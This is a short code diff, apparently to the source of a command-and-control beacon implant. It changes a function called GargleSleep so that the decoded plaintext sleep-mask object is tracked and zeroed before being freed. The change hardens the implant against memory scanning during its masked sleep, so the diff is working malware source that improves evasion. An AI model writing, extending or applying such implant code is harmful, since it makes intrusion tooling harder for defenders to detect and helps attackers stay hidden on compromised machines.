@@ -152,6 +152,9 @@ void GargleSleep(DWORD time) {
 		data_extract(&parser);
 		prefix = dlen - parser.length;
 		entry = data_int(&parser);
+		/* decoded holds the plaintext sleep-mask BOF across the masked
+		 * sleep - pull it into the walk, then wipe it before free */
+		track_memory_add(decoded, 16384, TRACK_MEMORY_MALLOC, TRUE, NULL);
 #if defined(_M_X64)
 		be_time = time;
 		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 1))
@@ -161,9 +164,12 @@ void GargleSleep(DWORD time) {
 		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 0))
 			Sleep(time);
 #endif
+		track_memory_remove(decoded);
+		memset(decoded, 0, 16384);
 		free(decoded);
 		return;
 	}
+	memset(decoded, 0, 16384);
 	free(decoded);
 
 #if defined(_M_IX86)
